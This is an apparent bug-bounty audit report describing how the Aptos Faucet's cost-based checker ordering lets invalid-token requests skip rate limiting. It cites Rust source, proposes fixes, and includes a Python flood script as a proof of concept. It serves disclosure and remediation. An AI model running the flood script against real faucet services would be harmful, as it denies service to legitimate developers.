# Audit Report

## Title
Aptos Faucet Rate Limiting Bypass via Authentication Token Checker Ordering

## Summary
The Aptos Faucet's `AuthTokenChecker` executes before rate limiting checkers due to cost-based ordering, allowing attackers to flood the service with invalid authentication tokens without being rate limited. When `return_rejections_early` is enabled (the recommended configuration), rejected requests never reach the rate limiter, enabling indefinite request flooding from a single IP address.

## Finding Description

The Aptos Faucet implements a checker pattern where all checkers are sorted by their cost value (lower cost executes first). [1](#0-0) 

The checker costs are defined as:
- `AuthTokenChecker`: cost = 2 [2](#0-1) 
- `MemoryRatelimitChecker`: cost = 20 [3](#0-2) 
- `RedisRatelimitChecker`: cost = 100 [4](#0-3) 

When the `return_rejections_early` configuration is enabled (recommended per documentation), the checker loop breaks as soon as any checker returns a rejection: [5](#0-4) 

**Attack Path:**
1. Attacker sends thousands of requests with invalid `Authorization: Bearer <invalid_token>` headers
2. Each request passes through: HTTP parsing → JSON deserialization → semaphore check → IP extraction → receiver validation → bypasser checks
3. `AuthTokenChecker.check()` executes and rejects the request because the token is not in the allowlist [6](#0-5) 
4. Due to early return, rate limiting checkers never execute
5. The attacker's IP is never tracked or rate limited
6. Process repeats indefinitely, consuming server resources (CPU for HTTP parsing, JSON deserialization, header extraction, HashSet lookups, error response generation)

The rate limiters increment their counters only when their `check()` method is called: [7](#0-6) 

Since the rate limiter's `check()` method never executes for invalid auth token requests, the IP is never tracked and the attacker can flood indefinitely.

## Impact Explanation

This vulnerability enables Denial of Service against the Aptos Faucet service, categorized as **Medium severity** per the Aptos bug bounty program:

- **Service Availability Impact**: Legitimate users cannot access testnet/devnet tokens when the faucet is under attack
- **Resource Exhaustion**: Each malicious request consumes CPU (HTTP parsing, JSON deserialization, header processing), memory (request buffering, response generation), and network bandwidth
- **Bypass of Security Controls**: The rate limiting mechanism is completely bypassed, defeating its intended purpose

While the faucet is not a consensus-critical component, its unavailability disrupts developer onboarding and testing workflows. The attack requires no special privileges and can be sustained from a single IP address.

The optional semaphore-based concurrency limiter [8](#0-7)  does not mitigate this attack, as it only limits concurrent requests (not sequential flooding) and may not be configured in all deployments.

## Likelihood Explanation

**Likelihood: High**

- **Ease of Exploitation**: Trivial - requires only sending HTTP POST requests with invalid `Authorization` headers
- **Attacker Requirements**: None - no authentication, no special access, no cost
- **Detection Difficulty**: Without proper monitoring, the attack appears as legitimate traffic until resource exhaustion occurs
- **Configuration Prevalence**: The vulnerable configuration (`return_rejections_early: true`) is explicitly recommended in the code documentation [9](#0-8) 

## Recommendation

**Solution 1 (Preferred): Reorder Checkers by Adjusting Costs**

Modify the `AuthTokenChecker` to have a higher cost than rate limiters, ensuring rate limiting executes first:

```rust
// In crates/aptos-faucet/core/src/checkers/auth_token.rs
fn cost(&self) -> u8 {
    150  // Higher than RedisRatelimitChecker (100) and MemoryRatelimitChecker (20)
}
```

This ensures IPs are tracked and rate limited before authentication checks occur.

**Solution 2: Add Pre-Checker Rate Limiting**

Implement middleware-level rate limiting based on source IP that executes before the checker pipeline, independent of checker ordering.

**Solution 3: Track Rejections Across All Checkers**

Modify rate limiters to increment counters even when requests are rejected by earlier checkers (requires architectural changes to share rejection state).

## Proof of Concept

```python
#!/usr/bin/env python3
"""
Proof of Concept: Aptos Faucet Rate Limiting Bypass
Demonstrates flooding with invalid auth tokens to bypass rate limiting
"""

import asyncio
import aiohttp
import time

FAUCET_URL = "http://localhost:8081/fund"  # Adjust to your faucet endpoint
INVALID_TOKEN = "invalid_token_12345"
NUM_REQUESTS = 1000

async def send_request(session, request_num):
    """Send a single request with invalid auth token"""
    headers = {
        "Authorization": f"Bearer {INVALID_TOKEN}",
        "Content-Type": "application/json"
    }
    payload = {
        "address": "0x1234567890abcdef1234567890abcdef1234567890abcdef1234567890abcdef"
    }
    
    try:
        async with session.post(FAUCET_URL, json=payload, headers=headers) as resp:
            status = resp.status
            print(f"Request {request_num}: Status {status}")
            return status
    except Exception as e:
        print(f"Request {request_num}: Error {e}")
        return None

async def main():
    """Execute flood attack"""
    print(f"Starting flood attack with {NUM_REQUESTS} requests...")
    print("Expected: All requests should be rejected with 403/400")
    print("Vulnerability: None will be rate limited, all from same IP\n")
    
    start_time = time.time()
    
    async with aiohttp.ClientSession() as session:
        tasks = [send_request(session, i) for i in range(NUM_REQUESTS)]
        results = await asyncio.gather(*tasks)
    
    elapsed = time.time() - start_time
    success_count = sum(1 for r in results if r in [403, 400])
    
    print(f"\nCompleted {NUM_REQUESTS} requests in {elapsed:.2f} seconds")
    print(f"Rejection rate: {success_count}/{NUM_REQUESTS}")
    print(f"Rate: {NUM_REQUESTS/elapsed:.2f} req/s")
    print("\nVulnerability confirmed: No rate limiting applied despite flooding from single IP")

if __name__ == "__main__":
    asyncio.run(main())
```

**Expected Behavior (Vulnerable):**
- All 1000 requests are rejected with 403/400 status codes
- No rate limiting is applied
- Requests complete successfully without any 429 (Too Many Requests) responses

**Expected Behavior (Fixed):**
- First N requests (per configured limit) are rejected with 403/400
- Subsequent requests are rejected with 429 status code
- `Retry-After` header indicates when the IP can retry

## Notes

This vulnerability specifically affects the Aptos Faucet service and does not impact the core blockchain consensus, execution, or state management. However, it represents a critical flaw in the faucet's security architecture that enables indefinite service disruption from a single attacker without IP rotation.

The root cause is the architectural decision to order checkers by computational cost rather than security priority. While this optimization reduces unnecessary work for clearly invalid requests, it creates a security gap where rate limiting—a foundational DoS protection—can be completely bypassed.

### Citations

**File:** crates/aptos-faucet/core/src/server/run.rs (L43-47)
```rust
    /// Whether we should return rejections the moment a Checker returns any,
    /// or should instead run through all Checkers first. Generally prefer
    /// setting this to true, as it is less work on the tap, but setting it
    /// to false does give the user more immediate information.
    pub return_rejections_early: bool,
```

**File:** crates/aptos-faucet/core/src/server/run.rs (L141-143)
```rust
        // Sort Checkers by cost, where lower numbers is lower cost, and lower
        // cost Checkers are at the start of the vec.
        checkers.sort_by_key(|a| a.cost());
```

**File:** crates/aptos-faucet/core/src/checkers/auth_token.rs (L54-64)
```rust
        if self.manager.contains(auth_token) {
            Ok(vec![])
        } else {
            Ok(vec![RejectionReason::new(
                format!(
                    "The given auth token is not allowed by the server: {}",
                    auth_token
                ),
                RejectionReasonCode::AuthTokenInvalid,
            )])
        }
```

**File:** crates/aptos-faucet/core/src/checkers/auth_token.rs (L67-69)
```rust
    fn cost(&self) -> u8 {
        2
    }
```

**File:** crates/aptos-faucet/core/src/checkers/memory_ratelimit.rs (L75-88)
```rust
        let mut ip_to_requests_today = self.ip_to_requests_today.lock().await;

        let requests_today = ip_to_requests_today.get_or_insert_mut(data.source_ip, || 1);
        if *requests_today >= self.max_requests_per_day {
            return Ok(vec![RejectionReason::new(
                format!(
                    "IP {} has exceeded the daily limit of {} requests",
                    data.source_ip, self.max_requests_per_day
                ),
                RejectionReasonCode::UsageLimitExhausted,
            )]);
        } else if !dry_run {
            *requests_today += 1;
        }
```

**File:** crates/aptos-faucet/core/src/checkers/memory_ratelimit.rs (L104-106)
```rust
    fn cost(&self) -> u8 {
        20
    }
```

**File:** crates/aptos-faucet/core/src/checkers/redis_ratelimit.rs (L337-339)
```rust
    fn cost(&self) -> u8 {
        100
    }
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L204-215)
```rust
        let permit = match &self.concurrent_requests_semaphore {
            Some(semaphore) => match semaphore.try_acquire() {
                Ok(permit) => Some(permit),
                Err(_) => {
                    return Err(AptosTapError::new(
                        "Server overloaded, please try again later".to_string(),
                        AptosTapErrorCode::ServerOverloaded,
                    ))
                },
            },
            None => None,
        };
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L263-269)
```rust
        for checker in &self.checkers {
            rejection_reasons.extend(checker.check(checker_data.clone(), dry_run).await.map_err(
                |e| AptosTapError::new_with_error_code(e, AptosTapErrorCode::CheckerError),
            )?);
            if !rejection_reasons.is_empty() && self.return_rejections_early {
                break;
            }
```
